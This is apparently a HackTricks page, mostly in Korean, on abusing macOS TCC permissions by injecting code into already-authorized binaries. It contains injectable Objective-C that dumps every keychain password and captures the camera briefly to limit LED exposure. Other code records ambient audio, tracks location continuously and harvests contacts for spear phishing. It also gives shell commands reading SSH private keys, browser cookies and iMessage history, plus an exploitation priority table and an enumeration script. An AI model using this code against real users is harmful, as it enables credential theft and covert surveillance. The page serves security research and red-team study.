# macOS TCC 권한을 통한 자격 증명 및 데이터 탈취

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

macOS TCC (Transparency, Consent, and Control)은 민감한 사용자 데이터에 대한 접근을 보호합니다. 공격자가 **이미 TCC 권한이 부여된 바이너리를 침해하면**, 해당 권한을 상속받습니다. 이 페이지는 데이터 탈취와 관련된 각 TCC 권한의 악용 가능성을 문서화합니다.

> [!WARNING]
> TCC 권한이 부여된 바이너리에 대한 코드 인젝션 (via DYLD injection, dylib hijacking, or task port) **묵시적으로 해당 바이너리의 모든 TCC 권한을 상속**합니다. 동일한 프로세스가 보호된 데이터를 읽을 때 추가적인 프롬프트나 검증은 없습니다.

---

## Keychain Access Groups

### 획득 가능한 항목

- **Wi-Fi passwords** — 저장된 모든 무선 네트워크 자격 증명
- **Website passwords** — Safari, Chrome (when using Keychain), 및 기타 브라우저 비밀번호
- **Application passwords** — 이메일 계정, VPN 자격 증명, 개발 토큰
- **Certificates and private keys** — 코드 서명, 클라이언트 TLS, S/MIME 암호화
- **Secure notes** — 사용자가 저장한 비밀

### Entitlement: `keychain-access-groups`

Keychain 항목은 **access groups**로 구성됩니다. 애플리케이션의 `keychain-access-groups` entitlement는 어떤 그룹에 접근할 수 있는지를 나열합니다:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## 카메라 접근 (kTCCServiceCamera)

### 악용

카메라 TCC 권한을 가진 바이너리(`kTCCServiceCamera` 또는 `com.apple.security.device.camera` entitlement를 통해)는 사진과 비디오를 캡처할 수 있습니다:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma**부터 메뉴 막대의 카메라 표시기는 항상 표시되며 프로그래밍 방식으로 숨길 수 없습니다. **이전 macOS 버전**에서는 짧은 캡처가 눈에 띄는 표시를 남기지 않을 수 있습니다.

---

## 마이크 접근 권한 (kTCCServiceMicrophone)

### 악용

마이크 접근 권한은 내장 마이크, 헤드셋 또는 연결된 오디오 입력 장치의 모든 오디오를 캡처합니다:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### 공격: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 위치 추적 (kTCCServiceLocation)

### 악용
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 지속적인 추적
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 연락처 / 캘린더 / 사진

### 개인 데이터 탈취

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 이름, 이메일, 전화번호, 주소 |
| `kTCCServiceCalendar` | `EventKit` | 회의, 참석자, 위치 |
| `kTCCServicePhotos` | `Photos.framework` | 사진, 스크린샷, 위치 메타데이터 |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 연락처 수집
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud 계정 액세스

### 권한: `com.apple.private.icloud-account-access`

이 권한은 `com.apple.iCloudHelper` XPC service와 통신할 수 있게 해주며, 다음에 대한 접근을 제공합니다:
- **iCloud tokens** — 사용자의 Apple ID에 대한 인증 토큰
- **iCloud Drive** — 모든 기기에서 동기화된 문서
- **iCloud Keychain** — 모든 Apple 기기에서 동기화된 비밀번호
- **Find My** — 사용자의 모든 Apple 기기 위치
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> iCloud 권한이 부여된 바이너리를 침해하면 공격이 **단일 기기에서 전체 Apple 생태계로 확장**됩니다: 다른 Macs, iPhones, iPads, Apple Watch. iCloud Keychain 동기화로 인해 모든 기기의 비밀번호에 접근할 수 있습니다.

---

## 전체 디스크 접근 (kTCCServiceSystemPolicyAllFiles)

### 가장 강력한 TCC 권한

전체 디스크 접근은 시스템의 **모든 파일**에 대한 읽기 권한을 부여합니다. 포함:
- 다른 앱의 데이터 (Messages, Mail, Safari 기록)
- TCC 데이터베이스(다른 모든 권한 노출)
- SSH 키와 구성
- 브라우저 쿠키 및 세션 토큰
- 애플리케이션 데이터베이스 및 캐시
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## 악용 우선순위 매트릭스

주입 가능한 TCC-granted binaries를 평가할 때는 데이터 가치에 따라 우선순위를 정하세요:

| 우선순위 | TCC Permission | 이유 |
|---|---|---|
| **치명적** | Full Disk Access | 모든 데이터/파일에 접근할 수 있음 |
| **치명적** | TCC Manager | 임의 권한을 부여할 수 있음 |
| **높음** | Keychain Access Groups | 저장된 모든 비밀번호 |
| **높음** | iCloud Account Access | 다중 기기 침해 |
| **높음** | Input Monitoring (ListenEvent) | 키로깅 |
| **높음** | Accessibility | GUI 제어 및 자체 권한 부여 가능 |
| **중간** | Screen Capture | 화면의 시각적 데이터 획득 |
| **중간** | Camera + Microphone | 감시(녹음·촬영) |
| **중간** | Contacts + Calendar | 소셜 엔지니어링에 사용되는 데이터 |
| **낮음** | Location | 물리적 추적 |
| **낮음** | Photos | 개인 사진/데이터 |

## 열거 스크립트
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## 참고자료

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
